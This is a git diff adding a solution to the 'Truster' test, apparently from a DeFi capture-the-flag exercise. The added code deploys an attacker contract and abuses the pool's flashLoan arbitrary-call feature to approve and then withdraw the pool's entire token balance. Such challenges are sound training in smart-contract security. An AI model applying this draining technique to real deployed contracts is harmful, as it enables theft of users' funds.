@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { Interface } = require('ethers/lib/utils');
 
 describe('[Challenge] Truster', function () {
     let deployer, attacker;
@@ -29,6 +30,28 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+
+        // Deploy Attacker contract.
+
+        const TrusterAttacker = await ethers.getContractFactory('TrusterAttacker', attacker)
+        const trusterAttacker = await TrusterAttacker.deploy(this.pool.address, this.token.address)
+
+        const availableFlashloanAmount = await this.token.balanceOf(this.pool.address)
+        console.log(await this.token.balanceOf(attacker.address))
+
+        // generate calldata to approve token transfer to TrusterAttacker contract address 
+        const iface = new Interface(["function approve(address spender, uint256 amount) external returns (bool)"])
+        const encodedFuntionData = iface.encodeFunctionData("approve", [trusterAttacker.address, availableFlashloanAmount])
+        await this.pool.flashLoan(0, attacker.address, this.token.address, encodedFuntionData)
+        await trusterAttacker.withDraw()
+
+        //const callData = 
+        // Generate calldata using encodeFunction. This data is for token allowance
+        console.log((await this.token.balanceOf(attacker.address)).toString())
+
+
+
+
     });
 
     after(async function () {
